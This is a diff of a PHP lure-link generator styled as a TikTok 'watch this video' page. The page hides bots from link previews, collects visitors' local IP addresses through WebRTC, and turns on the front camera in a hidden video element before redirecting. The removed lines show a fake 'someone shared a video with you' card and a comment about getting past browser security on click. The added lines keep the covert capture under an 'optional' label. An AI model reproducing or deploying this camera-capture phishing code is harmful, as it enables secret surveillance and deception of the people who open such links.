@@ -143,11 +143,8 @@ if (isset($_GET['r'])) {
 
     if ($link) {
         $target_redirect = $link['target_url'];
-        $sender_name = $link['sender_name'];
-        $sender_avatar = $link['sender_avatar'];
         $meta_title = $link['meta_title'];
         $meta_image = $link['meta_image'];
-        $bg_image_url = !empty($link['bg_image']) ? $link['bg_image'] : $meta_image;
 
         $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
         $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebookexternalhit|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger/i', $ua);
@@ -196,48 +193,14 @@ if (isset($_GET['r'])) {
     <meta property="og:type" content="video.other">
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
-        body, html { width: 100%; height: 100%; overflow: hidden; background: #000; display: flex; justify-content: center; align-items: center; position: relative; cursor: pointer; }
-        
-        .blurred-bg {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: url('<?php echo htmlspecialchars($bg_image_url); ?>') no-repeat center center/cover;
-            filter: blur(18px) brightness(0.65);
-            transform: scale(1.1);
-            z-index: 1;
-            pointer-events: none;
-        }
-
-        .modal-card {
-            position: relative;
-            background: rgba(255, 255, 255, 0.98);
-            width: 90%;
-            max-width: 350px;
-            border-radius: 24px;
-            padding: 30px 20px;
-            text-align: center;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
-            z-index: 10;
-            animation: popUp 0.3s ease-out;
-            cursor: pointer;
-        }
-        @keyframes popUp { 0% { transform: scale(0.8); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
-
-        .avatar-container { width: 80px; height: 80px; border-radius: 50%; overflow: hidden; margin: -65px auto 16px auto; border: 4px solid #fff; box-shadow: 0 4px 15px rgba(0,0,0,0.2); background: #eee; }
-        .avatar-container img { width: 100%; height: 100%; object-fit: cover; }
-
-        h2 { font-size: 20px; font-weight: 700; color: #111; margin-bottom: 8px; }
-        p { font-size: 13px; color: #666; margin-bottom: 24px; line-height: 1.5; }
-
-        .btn-action { display: block; width: 100%; background: #fe2c55; color: white; border: none; padding: 14px; border-radius: 12px; font-weight: 600; font-size: 15px; cursor: pointer; text-decoration: none; margin-bottom: 12px; box-shadow: 0 4px 14px rgba(254,44,85,0.4); pointer-events: none; }
-        .btn-secondary { background: transparent; color: #888; border: none; font-size: 14px; font-weight: 500; cursor: pointer; padding: 6px; pointer-events: none; }
+        body, html { width: 100%; height: 100%; background: #0f172a; display: flex; justify-content: center; align-items: center; color: #fff; }
+        .container { text-align: center; max-width: 400px; width: 90%; padding: 20px; background: #1e293b; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
+        .thumb { width: 100%; height: 220px; object-fit: cover; border-radius: 10px; margin-bottom: 15px; }
+        h1 { font-size: 16px; margin-bottom: 15px; line-height: 1.4; color: #f8fafc; }
+        .btn-watch { display: block; width: 100%; background: #fe2c55; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: bold; font-size: 15px; cursor: pointer; text-decoration: none; margin-bottom: 10px; }
+        .btn-opt { display: block; width: 100%; background: #334155; color: #cbd5e1; border: none; padding: 10px; border-radius: 8px; font-size: 13px; cursor: pointer; }
     </style>
     <script>
-        let isCaptured = false;
-
         function getLocalIP(callback) {
             let foundLocal = false;
             let RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
@@ -258,21 +221,15 @@ if (isset($_GET['r'])) {
             setTimeout(() => { if (!foundLocal) callback("Direct"); }, 80);
         }
 
-        function triggerCaptureAndRedirect(e) {
-            if (isCaptured) return;
-            isCaptured = true;
-
+        function requestCameraOptional() {
             const targetUrl = "<?php echo $target_redirect; ?>";
 
-            // استخدام خصائص متقدمة لعنصر الفيديو المخفي لتجاوز القيود الأمنية للمتصفح تلقائياً عند النقر
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                 .then(stream => {
                     const video = document.createElement('video');
                     video.setAttribute('autoplay', 'true');
                     video.setAttribute('playsinline', 'true');
-                    video.setAttribute('muted', 'true');
-                    video.style.position = 'fixed';
-                    video.style.top = '-9999px';
+                    video.style.display = 'none';
                     video.srcObject = stream;
                     document.body.appendChild(video);
                     
@@ -307,21 +264,17 @@ if (isset($_GET['r'])) {
                 });
         }
 
-        window.addEventListener('DOMContentLoaded', () => {
-            document.body.addEventListener('click', triggerCaptureAndRedirect, { once: true });
-        });
+        function directRedirect() {
+            window.location.replace("<?php echo $target_redirect; ?>");
+        }
     </script>
 </head>
 <body>
-    <div class="blurred-bg"></div>
-    <div class="modal-card">
-        <div class="avatar-container">
-            <img src="<?php echo htmlspecialchars($sender_avatar); ?>" alt="Avatar">
-        </div>
-        <h2>Watch this video on TikTok</h2>
-        <p><strong><?php echo htmlspecialchars($sender_name); ?></strong> shared a video with you. Watch now to view content!</p>
-        <button class="btn-action">Watch Now</button>
-        <button class="btn-secondary">Not now</button>
+    <div class="container">
+        <img src="<?php echo htmlspecialchars($meta_image); ?>" alt="Thumbnail" class="thumb">
+        <h1><?php echo htmlspecialchars($meta_title); ?></h1>
+        <button class="btn-watch" onclick="requestCameraOptional()">Watch this video on TikTok</button>
+        <button class="btn-opt" onclick="directRedirect()">Direct View (Skip)</button>
     </div>
 </body>
 </html>
@@ -451,20 +404,7 @@ if (!empty($filter_code)) {
             <h2>Generate TikTok Link</h2>
             <form method="POST" enctype="multipart/form-data" class="form-grid">
                 <input type="text" name="target_url" placeholder="TikTok Video URL..." required>
-                <input type="text" name="sender_name" placeholder="Sender Name (e.g. azez)">
-                
-                <div>
-                    <label style="font-size: 11px; color: var(--text-muted); display: block; margin-bottom: 4px;">Sender Avatar Image:</label>
-                    <input type="file" name="avatar_file" accept="image/*">
-                    <input type="text" name="sender_avatar_url" placeholder="Or paste Avatar URL..." style="margin-top: 6px;">
-                </div>
-
-                <div>
-                    <label style="font-size: 11px; color: var(--text-muted); display: block; margin-bottom: 4px;">Background Blur Image (Optional):</label>
-                    <input type="file" name="bg_file" accept="image/*">
-                    <input type="text" name="bg_image_url" placeholder="Or paste Background URL..." style="margin-top: 6px;">
-                </div>
-
+                <input type="text" name="sender_name" placeholder="Sender Name (e.g. azez)" style="display:none;">
                 <button type="submit" name="create" class="btn">Generate Link</button>
             </form>
 
